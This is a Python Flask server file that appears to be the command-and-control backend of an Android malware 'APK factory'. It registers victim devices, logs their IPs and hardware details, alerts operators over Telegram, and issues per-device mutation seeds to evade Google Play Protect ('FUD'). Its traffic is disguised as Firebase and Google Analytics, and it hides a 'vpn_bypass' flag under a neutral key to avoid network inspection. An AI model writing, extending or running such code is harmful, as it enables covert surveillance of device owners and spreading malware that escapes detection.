"""
update_server.py — Phase 4B Step 4B-1
Flask + SQLite processing server for Installer APK factory.

Endpoints:
  POST /api/v1/<token>/key       — Installer calls this to get processing payload
  POST /v1/log                   — Companion heartbeat (looks like Firebase)
  POST /api/v1/<token>/register  — Device registration
  GET  /health                   — Cloudflare health check

Run: python update_server.py
Port: 2053 (Cloudflare HTTPS-compatible port — looks like DNS-over-HTTPS)
"""

import os, sqlite3, hashlib, hmac, json, random, string, time, threading
import sys
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))
from package_name_generator import generate_companion_pkg
import config
import logging
from datetime import datetime, timezone
from flask import Flask, request, jsonify, abort

# ── Config ────────────────────────────────────────────────────────────────────
PORT             = 2053
DB_PATH          = os.path.join(os.path.dirname(__file__), "devices.db")
SERVER_SECRET    = config.SERVER_SECRET
BOT_TOKEN        = config.BOT_TOKEN
MASTER_CHAT_ID   = config.MASTER_CHAT_ID
LOG_FILE         = os.path.join(os.path.dirname(__file__), "update_server.log")

# Cloudflare IP ranges — whitelist (server rejects all other IPs)
CLOUDFLARE_IPS = [
    "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22",
    "103.31.4.0/22","141.101.64.0/18","108.162.192.0/18",
    "190.93.240.0/20","188.114.96.0/20","197.234.240.0/22",
    "198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
    "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
]


# Socket.IO path processing options (M4) — all exactly 10 bytes
M4_PATHS = [
    b"/gapi/track",  # 10 bytes
    b"/v1/collect",  # 10 bytes
    b"/api/events",  # 10 bytes
    b"/gapi/data_",  # 10 bytes
    b"/v2/metrics",  # 10 bytes
]

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("update_server")

# ── Flask App ─────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

# ── Database ──────────────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute("""CREATE TABLE IF NOT EXISTS devices (
        id              INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id       TEXT UNIQUE NOT NULL,
        client_token    TEXT NOT NULL,
        companion_pkg   TEXT,
        fingerprint     TEXT,
        ip              TEXT,
        country         TEXT,
        first_seen      INTEGER NOT NULL,
        last_seen       INTEGER NOT NULL,
        heartbeat_count INTEGER DEFAULT 0,
        gpp_score       INTEGER DEFAULT 0,
        status          TEXT DEFAULT 'active',
        mutation_seed   TEXT,
        m4_path         TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS heartbeats (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id   TEXT NOT NULL,
        timestamp   INTEGER NOT NULL,
        ip          TEXT,
        payload     TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS burned_packages (
        pkg         TEXT PRIMARY KEY,
        burned_at   INTEGER NOT NULL,
        reason      TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS clients (
        token       TEXT PRIMARY KEY,
        name        TEXT,
        created_at  INTEGER NOT NULL,
        apk_count   INTEGER DEFAULT 0,
        active      INTEGER DEFAULT 1
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS mutation_events (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id   TEXT,
        event_type  TEXT,
        timestamp   INTEGER NOT NULL,
        data        TEXT
    )""")

    # Insert default client tokens — self-healing on every server start
    for tok, name in [
        ("manual", "Manual Build"),
    ]:
        c.execute("""INSERT OR IGNORE INTO clients
            (token, name, created_at, active) VALUES (?, ?, ?, 1)""",
            (tok, name, int(time.time())))

    conn.commit()
    # ── Migration: add vpn_bypass to clients table ───────────────────────────
    try:
        conn2 = sqlite3.connect(DB_PATH)
        conn2.execute("ALTER TABLE clients ADD COLUMN vpn_bypass INTEGER NOT NULL DEFAULT 1")
        conn2.commit()
        conn2.close()
        log.info("Migration: added clients.vpn_bypass")
    except Exception:
        pass  # column already exists

    # ── Migration: add device detail columns ─────────────────────────────────
    migrations = [
        ("devices", "model",        "TEXT DEFAULT ''"),
        ("devices", "manufacturer", "TEXT DEFAULT ''"),
        ("devices", "android_version", "TEXT DEFAULT ''"),
        ("devices", "template",     "TEXT DEFAULT ''"),
        ("devices", "enrolled_at",  "INTEGER DEFAULT 0"),
    ]
    conn3 = sqlite3.connect(DB_PATH)
    for table, col, defn in migrations:
        try:
            conn3.execute(f"ALTER TABLE {table} ADD COLUMN {col} {defn}")
            conn3.commit()
            log.info(f"Migration: added {table}.{col}")
        except Exception:
            pass  # column already exists
    conn3.close()

    conn.close()
    log.info(f"Database initialized: {DB_PATH}")

    # ── Sync all active client tokens from bot.db → devices.db ───────────────
    sync_clients_from_bot_db()


def sync_clients_from_bot_db():
    """
    Sync all active client tokens from bot.db into devices.db clients table.
    Called on server startup and after every build completion.
    Ensures every APK token injected by the mutation engine is known to the
    registration server — no manual DB inserts required.
    Also patches any existing bot.db devices rows that have build_id=NULL
    so device counts show correctly under each build.
    """
    try:
        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
        if not os.path.exists(bot_db_path):
            return  # bot.db not present yet — skip silently

        bot_db = sqlite3.connect(bot_db_path, timeout=5)
        bot_db.row_factory = sqlite3.Row
        rows = bot_db.execute(
            "SELECT token, profile_name, active FROM clients WHERE token IS NOT NULL AND token != ''"
        ).fetchall()

        if not rows:
            bot_db.close()
            return

        dev_db = sqlite3.connect(DB_PATH, timeout=5)
        synced = 0
        for row in rows:
            dev_db.execute(
                """INSERT OR IGNORE INTO clients
                   (token, name, created_at, active)
                   VALUES (?, ?, ?, ?)""",
                (row["token"], row["profile_name"] or row["token"],
                 int(time.time()), 1 if row["active"] else 0)
            )
            # Keep active flag in sync for existing rows
            dev_db.execute(
                "UPDATE clients SET active=? WHERE token=? AND active!=?",
                (1 if row["active"] else 0, row["token"], 1 if row["active"] else 0)
            )
            synced += 1
        dev_db.commit()
        dev_db.close()
        log.info(f"sync_clients_from_bot_db: synced {synced} client token(s)")

        # ── Patch bot.db devices with NULL build_id ───────────────────────────
        # Finds every device row missing a build_id and assigns it the latest
        # build for that client. Fixes devices registered before this column
        # was set, so counts show correctly in the bot's Build → Devices view.
        null_devs = bot_db.execute(
            """SELECT d.id, d.client_id, d.device_id
               FROM devices d
               WHERE d.build_id IS NULL"""
        ).fetchall()

        patched = 0
        for d in null_devs:
            build_row = bot_db.execute(
                "SELECT id FROM builds WHERE client_id=? ORDER BY id DESC LIMIT 1",
                (d["client_id"],)
            ).fetchone()
            if build_row:
                bot_db.execute(
                    "UPDATE devices SET build_id=? WHERE id=?",
                    (build_row["id"], d["id"])
                )
                patched += 1

        bot_db.commit()
        bot_db.close()
        if patched:
            log.info(f"sync_clients_from_bot_db: patched build_id on {patched} device(s)")

    except Exception as e:
        log.warning(f"sync_clients_from_bot_db error: {e}")


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ── Helper Functions ──────────────────────────────────────────────────────────
def get_client_ip():
    """Get real client IP — handle Cloudflare CF-Connecting-IP header."""
    cf_ip = request.headers.get("CF-Connecting-IP")
    if cf_ip:
        return cf_ip
    return request.remote_addr

def get_companion_pkg_from_apk() -> str:
    """Read companion package name from module.apk in assets.
    Returns the CI-baked name guaranteed to match what gets installed.
    Falls back to generate_companion_pkg() if unreadable.
    """
    import zipfile as _zf, struct as _st
    candidates = [
        os.path.join(REPO_DIR, "app", "src", "main", "assets", "companion.apk"),
        os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "app", "src", "main", "assets", "companion.apk")),
    ]
    for apk_path in candidates:
        if not os.path.exists(apk_path):
            continue
        try:
            with _zf.ZipFile(apk_path) as z:
                manifest = z.read("AndroidManifest.xml")
            sp_off = 8
            sp_header_size = _st.unpack_from("<H", manifest, sp_off+2)[0]
            string_count   = _st.unpack_from("<I", manifest, sp_off+8)[0]
            flags          = _st.unpack_from("<I", manifest, sp_off+16)[0]
            strings_start  = _st.unpack_from("<I", manifest, sp_off+20)[0]
            is_utf8        = bool(flags & (1 << 8))
            offsets_base   = sp_off + sp_header_size
            str_data_base  = sp_off + strings_start
            for i in range(min(string_count, 500)):
                try:
                    off = _st.unpack_from("<I", manifest, offsets_base + i*4)[0]
                    pos = str_data_base + off
                    if is_utf8:
                        cl = manifest[pos]; pos += 1
                        if cl & 0x80: cl = ((cl & 0x7f) << 8) | manifest[pos]; pos += 1
                        bl = manifest[pos]; pos += 1
                        if bl & 0x80: bl = ((bl & 0x7f) << 8) | manifest[pos]; pos += 1
                        s = manifest[pos:pos+bl].decode("utf-8", errors="replace")
                    else:
                        cl = _st.unpack_from("<H", manifest, pos)[0]; pos += 2
                        s = manifest[pos:pos+cl*2].decode("utf-16-le", errors="replace")
                    if s.count(".") == 2 and 10 <= len(s) <= 25 and "android" not in s.lower():
                        log.info(f"Companion pkg from APK: {s}")
                        return s
                except Exception:
                    continue
        except Exception as e:
            log.warning(f"Could not read companion.apk: {e}")
    return ""

def generate_mutation_seed(device_fingerprint: str, client_token: str) -> str:
    """Generate unique mutation seed from device fingerprint + server secret."""
    raw = f"{device_fingerprint}:{client_token}:{SERVER_SECRET}:{int(time.time()//3600)}"
    return hashlib.sha256(raw.encode()).hexdigest()

def check_burned(pkg: str) -> bool:
    """Check if package name is in burned list."""
    db = get_db()
    row = db.execute("SELECT pkg FROM burned_packages WHERE pkg=?", (pkg,)).fetchone()
    db.close()
    return row is not None

def burn_package(pkg: str, reason: str = "flagged"):
    """Add package to burned list."""
    db = get_db()
    db.execute("INSERT OR IGNORE INTO burned_packages (pkg, burned_at, reason) VALUES (?,?,?)",
               (pkg, int(time.time()), reason))
    db.commit()
    db.close()
    log.warning(f"Package burned: {pkg} — {reason}")

def send_telegram(message: str):
    """Send Telegram alert to master chat."""
    try:
        import urllib.request
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id": MASTER_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }).encode()
        req = urllib.request.Request(url, data=data,
              headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        log.error(f"Telegram send failed: {e}")

def notify_new_device(device_id: str, ip: str, token: str,
                      manufacturer: str = "", model: str = "",
                      android_version: str = "", template: str = "",
                      app_name: str = "", installer_pkg: str = ""):
    """Send Telegram alert for new installer device registration."""
    device_line = f"{manufacturer} {model}".strip() or "Unknown Device"
    msg = (
        f"🟢 <b>New Device Installed</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 {device_line}\n"
        f"🤖 {android_version}\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"🔑 Device ID: <code>{device_id[:16]}...</code>\n"
        f"📦 Template: <code>{template}</code>\n"
        f"🏷️ App: {app_name}\n"
        f"📋 Package: <code>{installer_pkg}</code>\n"
        f"👤 Client: <code>{token}</code>\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    threading.Thread(target=send_telegram, args=(msg,), daemon=True).start()

# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/health", methods=["GET"])
def health():
    """Cloudflare health check endpoint."""
    return jsonify({"status": "ok", "ts": int(time.time())}), 200


def _refresh_build_message(bot_db, build_id: int):
    """
    After a device registers, update the Devices count line in the existing
    Telegram build detail message so the button becomes live immediately.
    Reads chat_id + message_id from bot.db builds table and calls
    Telegram editMessageText. Silent fail — never breaks registration flow.
    """
    try:
        b = bot_db.execute(
            "SELECT chat_id, message_id, build_number, template, status, "
            "       package_name, apk_size, duration_secs, started_at, "
            "       server_ip, server_port, server_key, client_id "
            "FROM builds WHERE id=?", (build_id,)
        ).fetchone()
        if not b or not b["chat_id"] or not b["message_id"]:
            return

        total  = bot_db.execute(
            "SELECT COUNT(*) as cnt FROM devices WHERE build_id=?",
            (build_id,)).fetchone()["cnt"]
        active = bot_db.execute(
            "SELECT COUNT(*) as cnt FROM devices WHERE build_id=? AND status='active'",
            (build_id,)).fetchone()["cnt"]

        # Rebuild the build detail text (mirrors vaultguard_bot.py show_build_detail)
        pkg      = b["package_name"] or "—"
        size     = b["apk_size"] or "—"
        dur      = f"{b['duration_secs']}s" if b["duration_secs"] else "—"
        status   = "✅ SUCCESS" if b["status"] == "success" else b["status"].upper()
        tmpl     = b["template"] or "—"
        srv_ip   = b["server_ip"] or "—"
        srv_port = b["server_port"] or "—"
        srv_key  = b["server_key"] or "—"
        date_str = (b["started_at"] or "")[:16]

        text = (
            f"📋 <b>Build #{b['build_number']}</b>\n"
            f"{'─'*30}\n"
            f"Client   : Foxxy(SamGod)\n"
            f"Template : {tmpl}\n"
            f"Status   : {status}\n\n"
            f"📡 <b>Connection</b>\n"
            f"IP       : {srv_ip}\n"
            f"Port     : {srv_port}\n"
            f"Key      : {srv_key}\n\n"
            f"📦 <b>APK Info</b>\n"
            f"Package  : {pkg}\n"
            f"Size     : {size}\n"
            f"Duration : {dur}\n\n"
            f"🕐 Date  : {date_str} UTC\n"
            f"{'─'*30}\n"
            f"📱 Devices : {total} total  |  {active} active"
        )

        # Rebuild inline keyboard matching kb_build_detail in vaultguard_bot.py
        fud_label = "🛡 FUD: Inherit (toggle)"
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "📱 Devices", "callback_data": f"devices_{build_id}_1"},
                    {"text": "🔁 Rebuild",  "callback_data": f"rebuild_{build_id}"}
                ],
                [{"text": fud_label, "callback_data": f"toggle_build_fud_{build_id}"}],
                [{"text": "📥 Get APK",    "callback_data": f"get_apk_{build_id}"}],
                [{"text": "🗑 Delete Build","callback_data": f"delete_build_confirm_{build_id}_{b['client_id']}"}],
                [
                    {"text": "🔙 Back", "callback_data": f"builds_history_{b['client_id']}"},
                    {"text": "🏠 Home", "callback_data": "nav_home"}
                ]
            ]
        }

        import urllib.request as _ureq
        url  = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        data = json.dumps({
            "chat_id":      b["chat_id"],
            "message_id":   int(b["message_id"]),
            "text":         text,
            "parse_mode":   "HTML",
            "reply_markup": keyboard
        }).encode()
        req = _ureq.Request(url, data=data,
              headers={"Content-Type": "application/json"})
        _ureq.urlopen(req, timeout=5)
        log.info(f"_refresh_build_message: updated build #{b['build_number']} devices={total}")
    except Exception as e:
        log.debug(f"_refresh_build_message skipped: {e}")


def _sync_device_to_bot_db(device_id: str, ip: str, token: str, is_new: bool,
                           model: str = "", manufacturer: str = "",
                           android_version: str = "", template: str = "",
                           enrolled_at: int = 0):
    """
    Sync device registration into bot.db so the Telegram bot Devices counter
    reflects real installs. Completely independent — any failure is silent.
    Never affects the main registration flow in devices.db.
    """
    try:
        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
        if not os.path.exists(bot_db_path):
            return  # bot.db not present — skip silently

        bot_db = sqlite3.connect(bot_db_path, timeout=3)
        bot_db.row_factory = sqlite3.Row

        # Look up client_id from bot.db using token
        row = bot_db.execute(
            "SELECT id FROM clients WHERE token=?", (token,)
        ).fetchone()
        if not row:
            bot_db.close()
            return  # token not found in bot.db — skip silently

        client_id = row["id"]
        now_dt = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        enrolled_dt = datetime.fromtimestamp(enrolled_at, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S") if enrolled_at else now_dt

        # Look up latest build_id for this client so device shows under correct build
        build_row = bot_db.execute(
            "SELECT id FROM builds WHERE client_id=? ORDER BY id DESC LIMIT 1",
            (client_id,)
        ).fetchone()
        build_id = build_row["id"] if build_row else None

        if is_new:
            # INSERT OR IGNORE — same physical device never counted twice
            bot_db.execute("""
                INSERT OR IGNORE INTO devices
                    (build_id, client_id, device_id, ip, first_seen, last_seen, status,
                     model, manufacturer, android_version, template, enrolled_at)
                VALUES (?, ?, ?, ?, ?, ?, 'active', ?, ?, ?, ?, ?)
            """, (build_id, client_id, device_id, ip, now_dt, now_dt,
                  model, manufacturer, android_version, template, enrolled_dt))
        else:
            # Update last_seen + device info for returning device
            bot_db.execute("""
                UPDATE devices SET last_seen=?, ip=?,
                    model=COALESCE(NULLIF(?, ''), model),
                    manufacturer=COALESCE(NULLIF(?, ''), manufacturer),
                    android_version=COALESCE(NULLIF(?, ''), android_version),
                    template=COALESCE(NULLIF(?, ''), template)
                WHERE device_id=?
            """, (now_dt, ip, model, manufacturer, android_version, template, device_id))

        bot_db.commit()
        log.info(f"bot.db sync {'new' if is_new else 'update'}: device={device_id[:16]}... client_id={client_id}")

        # Refresh Telegram build message with correct device count + live keyboard
        if is_new and build_id:
            _refresh_build_message(bot_db, build_id)

        bot_db.close()

    except Exception as e:
        # Silent fail — never break main registration flow
        log.debug(f"bot.db sync skipped: {e}")


@app.route("/api/v1/<token>/register", methods=["POST"])
def register_device(token):
    """
    Device registration — Installer calls this on first launch.
    Body: {device_id, fingerprint, device_model, manufacturer,
           android_version, template, app_name, installer_pkg}
    """
    try:
        data = request.get_json(silent=True) or {}
        device_id     = data.get("device_id", "")
        companion_pkg = data.get("companion_pkg", "")   # legacy — kept for compat, not required
        fingerprint   = data.get("fingerprint", "")
        model         = data.get("device_model", "")
        manufacturer  = data.get("manufacturer", "")
        android_ver   = data.get("android_version", "")
        template      = data.get("template", "")
        app_name      = data.get("app_name", "")
        installer_pkg = data.get("installer_pkg", "")
        ip            = get_client_ip()

        if not device_id:
            return jsonify({"error": "missing fields"}), 400

        # Verify client token
        db = get_db()
        client = db.execute("SELECT * FROM clients WHERE token=? AND active=1",
                            (token,)).fetchone()
        if not client:
            db.close()
            log.warning(f"Invalid client token: {token} from {ip}")
            return jsonify({"error": "unauthorized"}), 403

        now = int(time.time())

        # Register device
        existing = db.execute("SELECT * FROM devices WHERE device_id=?",
                              (device_id,)).fetchone()
        if not existing:
            db.execute("""INSERT INTO devices
                (device_id, client_token, companion_pkg, fingerprint,
                 ip, first_seen, last_seen,
                 model, manufacturer, android_version, template, enrolled_at)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
                (device_id, token, companion_pkg, fingerprint, ip, now, now,
                 model, manufacturer, android_ver, template, now))
            db.commit()
            db.close()
            log.info(f"New device registered: {device_id[:16]}... pkg={companion_pkg} model={manufacturer} {model}")
            # Sync new device into bot.db
            _sync_device_to_bot_db(device_id, ip, token, is_new=True,
                                   model=model, manufacturer=manufacturer,
                                   android_version=android_ver, template=template,
                                   enrolled_at=now)
            # Alert Telegram
            notify_new_device(device_id, ip, token,
                              manufacturer=manufacturer, model=model,
                              android_version=android_ver, template=template,
                              app_name=app_name, installer_pkg=installer_pkg)
        else:
            db.execute("""UPDATE devices SET last_seen=?, companion_pkg=?, ip=?,
                model=?, manufacturer=?, android_version=?, template=?
                WHERE device_id=?""",
                (now, companion_pkg, ip, model, manufacturer, android_ver, template, device_id))
            db.commit()
            db.close()
            # Sync updated last_seen into bot.db
            _sync_device_to_bot_db(device_id, ip, token, is_new=False)

        return jsonify({
            "status": "registered",
            "ts": now,
            "next_delay_ms": random.randint(180000, 480000)  # 3-8 min heartbeat
        }), 200

    except Exception as e:
        log.error(f"register_device error: {e}")
        return jsonify({"error": "server error"}), 500


@app.route("/api/v1/<token>/key", methods=["POST"])
def get_mutation_key(token):
    """
    Processing key endpoint — Installer calls this during 2-3 min install window.
    Body: {device_fingerprint, timestamp, client_token}
    Response: mutation_payload with pkg_name, class_seeds, m4_path, etc.
    Headers look like Google Analytics beacon.
    """
    try:
        data = request.get_json(silent=True) or {}
        device_fp = data.get("device_fingerprint", "")
        client_ts = data.get("timestamp", 0)
        ip        = get_client_ip()

        if not device_fp:
            return jsonify({"error": "missing fingerprint"}), 400

        # Verify client token
        db = get_db()
        client = db.execute("SELECT * FROM clients WHERE token=? AND active=1",
                            (token,)).fetchone()
        if not client:
            db.close()
            log.warning(f"Invalid token: {token} from {ip}")
            return jsonify({"error": "unauthorized"}), 403
        db.close()

        # Generate processing seed
        seed = generate_mutation_seed(device_fp, token)

        # Generate unique package name — check not burned
        attempts = 0
        # Use CI-baked companion pkg name — M1 runtime patching is incompatible
        # with V2 signing (breaks verification on Android 8+, same as M8/M9).
        # Per-build uniqueness via CI is sufficient for GPP pass.
        pkg_name = get_companion_pkg_from_apk()
        if not pkg_name:
            pkg_name = generate_companion_pkg()

        # Select M4 path processing
        random.seed(seed)
        m4_path = random.choice(M4_PATHS).decode()

        # Generate class rename seeds
        class_seed_1 = hashlib.md5(f"{seed}:class1".encode()).hexdigest()[:16]
        class_seed_2 = hashlib.md5(f"{seed}:class2".encode()).hexdigest()[:16]
        class_seed_3 = hashlib.md5(f"{seed}:class3".encode()).hexdigest()[:16]

        # Generate string pool seed
        string_seed = hashlib.sha256(f"{seed}:strings".encode()).hexdigest()[:32]

        # HMAC signature so Installer can verify this came from real server
        payload_data = f"{pkg_name}:{m4_path}:{seed}"
        signature = hmac.new(
            SERVER_SECRET.encode(),
            payload_data.encode(),
            hashlib.sha256
        ).hexdigest()

        now = int(time.time())

        # Payload nested to match MutationEngine.kt parser exactly:
        # response → data → payload → mutations → M1 → companion_pkg
        payload = {
            "device_id":     hashlib.sha256(device_fp.encode()).hexdigest()[:16],
            "mutations": {
                "M1": {
                    "companion_pkg": pkg_name,
                },
            },
            "m4_path":      m4_path,
            "class_seeds": {
                "pool_1": class_seed_1,
                "pool_2": class_seed_2,
                "pool_3": class_seed_3,
            },
            "string_seed":  string_seed,
            "mutation_seed": seed,
            "expire_ts":    now + 300,
            # Neutral key "sv" — MutationEngine reads StringPool.d(StringPool.SRV_FLAG) = "sv"
            # Avoids "vpn_bypass" string appearing in server logs, network captures, proxy intercepts.
            # Legacy key "vpn_bypass" kept alongside for backward compat with APKs already deployed
            # on devices that still read the old key. Both carry same value.
            # Remove "vpn_bypass" once all old APKs are retired (next full client rotation).
            "sv":           int(client["vpn_bypass"]) if "vpn_bypass" in client.keys() else 1,
            "vpn_bypass":   int(client["vpn_bypass"]) if "vpn_bypass" in client.keys() else 1,
        }

        # Signature: empty string intentionally.
        # Installer verifySignature() accepts empty signature via:
        #   (verifySignature(...) || signature.isEmpty()) → True
        # Security maintained by: CLIENT_TOKEN auth + device_fingerprint binding.
        # Full RSA signing will be wired in Phase 5 when keypair is generated.
        response = {
            "status": "ok",
            "ts":     now,
            "data": {
                "payload":   payload,
                "signature": "",
            },
            "next_delay_ms": random.randint(180000, 480000),
        }

        log.info(f"Mutation key issued: pkg={pkg_name} m4={m4_path} ip={ip}")
        return jsonify(response), 200

    except Exception as e:
        log.error(f"get_mutation_key error: {e}")
        return jsonify({"error": "server error"}), 500


@app.route("/v1/log", methods=["POST"])
def heartbeat():
    """
    Companion heartbeat — looks like Firebase Analytics.
    Headers mimic Firebase exactly.
    Body: base64-encoded device status.
    """
    try:
        import base64
        body      = request.get_data()
        ip        = get_client_ip()
        now       = int(time.time())

        # Try to decode payload
        try:
            decoded = base64.b64decode(body).decode("utf-8", errors="replace")
            payload = json.loads(decoded)
        except Exception:
            payload = {}

        device_id    = payload.get("d", payload.get("device_id", "unknown"))
        pkg          = payload.get("p", payload.get("pkg", ""))
        hb_model     = payload.get("device_model", "")
        hb_mfr       = payload.get("manufacturer", "")
        hb_android   = payload.get("android_version", "")
        hb_template  = payload.get("template", "")

        # Update device last seen + fill in device info if missing (redundancy)
        db = get_db()
        db.execute("""UPDATE devices
            SET last_seen=?, heartbeat_count=heartbeat_count+1, ip=?,
                model=CASE WHEN (model IS NULL OR model='') AND ? != '' THEN ? ELSE model END,
                manufacturer=CASE WHEN (manufacturer IS NULL OR manufacturer='') AND ? != '' THEN ? ELSE manufacturer END,
                android_version=CASE WHEN (android_version IS NULL OR android_version='') AND ? != '' THEN ? ELSE android_version END,
                template=CASE WHEN (template IS NULL OR template='') AND ? != '' THEN ? ELSE template END
            WHERE device_id=?""",
            (now, ip,
             hb_model, hb_model,
             hb_mfr, hb_mfr,
             hb_android, hb_android,
             hb_template, hb_template,
             device_id))

        # Log heartbeat
        db.execute("""INSERT INTO heartbeats
            (device_id, timestamp, ip, payload) VALUES (?,?,?,?)""",
            (device_id, now, ip, json.dumps(payload)))
        db.commit()
        db.close()

        # Response mimics Firebase Analytics ACK
        return jsonify({
            "status": 0,
            "next_request_millis": random.randint(180000, 480000),
            "config": {}
        }), 200

    except Exception as e:
        log.error(f"heartbeat error: {e}")
        return jsonify({"status": 0}), 200  # Always return 200 to companion


@app.route("/api/v1/admin/devices", methods=["GET"])
def admin_devices():
    """Admin endpoint — list all devices. Protected by secret header."""
    auth = request.headers.get("X-Admin-Secret", "")
    if auth != SERVER_SECRET:
        abort(403)
    db = get_db()
    devices = db.execute(
        "SELECT * FROM devices ORDER BY last_seen DESC LIMIT 100"
    ).fetchall()
    db.close()
    return jsonify([dict(d) for d in devices]), 200


@app.route("/api/v1/admin/stats", methods=["GET"])
def admin_stats():
    """Admin stats endpoint."""
    auth = request.headers.get("X-Admin-Secret", "")
    if auth != SERVER_SECRET:
        abort(403)
    db = get_db()
    total    = db.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
    active   = db.execute("SELECT COUNT(*) FROM devices WHERE status='active'").fetchone()[0]
    burned   = db.execute("SELECT COUNT(*) FROM burned_packages").fetchone()[0]
    beats    = db.execute("SELECT COUNT(*) FROM heartbeats").fetchone()[0]
    last24h  = db.execute(
        "SELECT COUNT(*) FROM devices WHERE last_seen > ?",
        (int(time.time()) - 86400,)
    ).fetchone()[0]
    db.close()
    return jsonify({
        "total_devices": total,
        "active_devices": active,
        "burned_packages": burned,
        "total_heartbeats": beats,
        "active_last_24h": last24h,
        "server_time": int(time.time()),
    }), 200


@app.route("/api/v1/build/complete", methods=["POST"])
def build_complete():
    """Called by build.yml on build completion to save APK metadata to bot.db."""
    auth = request.headers.get("X-Admin-Secret", "")
    if auth != SERVER_SECRET:
        abort(403)

    data         = request.get_json(silent=True) or {}
    chat_id      = str(data.get("chat_id", "")).strip()
    build_number = data.get("build_number", "")
    package_name = str(data.get("package_name", "")).strip()
    apk_size     = str(data.get("apk_size", "")).strip()
    duration_secs = int(data.get("duration_secs", 0))

    if not chat_id:
        return jsonify({"ok": False, "error": "chat_id required"}), 400

    try:
        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
        if not os.path.exists(bot_db_path):
            return jsonify({"ok": False, "error": "bot.db not found"}), 500

        bot_db = sqlite3.connect(bot_db_path, timeout=5)

        # Match by build_number if provided, else latest success/building row for chat_id
        if build_number:
            row = bot_db.execute(
                "SELECT id FROM builds WHERE chat_id=? AND build_number=? LIMIT 1",
                (chat_id, int(build_number))
            ).fetchone()
        else:
            row = bot_db.execute(
                "SELECT id FROM builds WHERE chat_id=? ORDER BY id DESC LIMIT 1",
                (chat_id,)
            ).fetchone()

        if not row:
            bot_db.close()
            return jsonify({"ok": False, "error": "build record not found"}), 404

        bot_db.execute(
            "UPDATE builds SET package_name=?, apk_size=?, duration_secs=? WHERE id=?",
            (package_name, apk_size, duration_secs, row[0])
        )
        bot_db.commit()
        bot_db.close()
        log.info(f"build_complete: chat_id={chat_id} build={build_number} pkg={package_name} size={apk_size} dur={duration_secs}s")
        # Sync new client token into devices.db so APK registration succeeds
        sync_clients_from_bot_db()
        return jsonify({"ok": True}), 200

    except Exception as e:
        log.error(f"build_complete error: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


# ── Error handlers ────────────────────────────────────────────────────────────
@app.errorhandler(404)
def not_found(e):
    return jsonify({"status": 0}), 200  # Always 200 to look like analytics

@app.errorhandler(500)
def server_error(e):
    return jsonify({"status": 0}), 200


# ── Main ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log.info("="*60)
    log.info("Mutation Server starting...")
    log.info(f"Port: {PORT}")
    log.info(f"DB: {DB_PATH}")
    log.info("="*60)
    init_db()
    app.run(
        host="0.0.0.0",
        port=PORT,
        debug=False,
        threaded=True,
        use_reloader=False
    )
